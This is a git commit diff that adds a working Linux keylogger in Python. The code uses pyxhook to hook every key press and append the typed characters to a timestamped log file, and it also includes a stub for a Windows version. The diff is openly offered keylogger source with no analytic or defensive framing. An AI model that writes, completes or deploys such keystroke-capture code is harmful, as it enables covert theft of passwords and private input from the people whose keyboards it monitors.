1d2c05a4369714bd1e423ada41c4018609fb5ce8
Khari <khariw921@gmail.com>
2024-11-08 18:01:41 -0500

    Barebones for linux keylogger, will revise soon.

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,20 +1,46 @@
 #!/usr/bin/python
 
 import os
-import datetime
+from datetime import datetime
 import pyxhook
 import platform
 
 # Function for Linux-based OS
 def linuxKeylogger():
-        #log = f"{os.getcwd}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log"
+    # Create log file
+    log = f"{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log"
 
-        print("Run Linux keylogger...")
+    def OnKeyPress(event):
+
+        # Open log file and append key presses
+        with open(log, "a") as f:
+            # If 'Enter' key is pressed, replace with newline
+            if event.Key == "P_Enter":
+                f.write('\n')
+            else:
+                # Append key presses to file and convert ascii to readable characters
+                f.write(f"{chr(event.Ascii)}")
+
+    hook = pyxhook.HookManager()
+    hook.KeyDown = OnKeyPress
+    hook.HookKeyboard()
+
+    try:
+        hook.start()
+    except KeyboardInterrupt:
+        # Exit program
+        hook.cancel()
+        pass
+    except Exception as ex:
+        msg = f"Error while catching events:\n {ex}"
+        pyxhook.print_err(msg)
+        with open(log, "a") as f:
+            f.write(f"\n{msg}")
 
 # Function for Windows-based OS
 def winKeylogger():
      
-     print("Run Windows keylogger...")
+    print("Run Windows keylogger...")
 
 
 def main():
@@ -25,7 +51,7 @@ def main():
     # Match case to run OS-dependant function
     match OS:
         case "Linux": linuxKeylogger() # Call Linux-based keylogger
-        case 'Windows': pass # Call Windows-based keylogger
+        case 'Windows': winKeylogger() # Call Windows-based keylogger
         case _: return "OS is not 'Windows' or 'Linux'."
 
 if __name__ == "__main__":
